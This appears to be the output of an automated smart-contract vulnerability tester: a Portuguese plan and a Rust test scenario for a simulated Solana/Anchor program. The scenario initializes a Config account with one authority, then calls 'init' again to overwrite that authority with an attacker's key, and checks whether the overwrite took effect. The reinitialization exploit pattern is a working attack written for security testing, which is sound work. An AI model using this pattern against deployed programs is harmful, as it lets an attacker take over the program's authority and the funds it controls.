{
  "plan": "A tentativa anterior usou uma conta Config pre-existente com authority aleatorio e is_initialized=false, mas o ataque nao produziu dano mensuravel porque o estado apos o ataque era identico ao estado apos o baseline (mesma authority, mesmo is_initialized=true, mesmo vault_balance=0). Para demonstrar REINIT de verdade, o baseline deve inicializar a conta com uma authority A, e o ataque deve reinicializar a mesma conta com uma authority B diferente. Assim, se o ataque tiver sucesso, o campo authority da conta Config sera sobrescrito de A para B, o que o uso legitimo nunca faria. O efeito medido e: apos o ataque, o authority lido da conta Config e igual a B (a nova authority do atacante), diferente da authority A gravada pelo baseline.",
  "scenario": "let authority_legit = Pubkey::new_unique();
let authority_ataque = Pubkey::new_unique();
let config_key = Pubkey::new_unique();

let dados_iniciais = anchor_account_data("Config", &(authority_legit, false, 0u64));

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_legit, true),
];

let contas = vec![
    (config_key, account(&env.program_id, &dados_iniciais, None)),
    (authority_legit, wallet(1_000_000_000)),
];

let ix = env.anchor_ix("init", &(), metas.clone());
let r = env.baseline("init legitimo com authority_legit", &ix, &contas);

let config_pos = after(&r, &config_key).clone();
let authority_pos = read_pubkey(config_pos.data(), 8);

let metas_ataque = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_ataque, true),
];

let contas_ataque = vec![
    (config_key, config_pos.clone()),
    (authority_ataque, wallet(1_000_000_000)),
];

let ix_ataque = env.anchor_ix("init", &(), metas_ataque);
let r_ataque = env.attack("reinit da conta Config ja inicializada com nova authority", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let config_depois = after(&r_ataque, &config_key);
    let authority_depois = read_pubkey(config_depois.data(), 8);
    env.effect(
        "conta Config ja inicializada foi reinicializada e authority foi sobrescrita para a do atacante",
        authority_depois == authority_ataque && authority_depois != authority_pos,
    );
}"
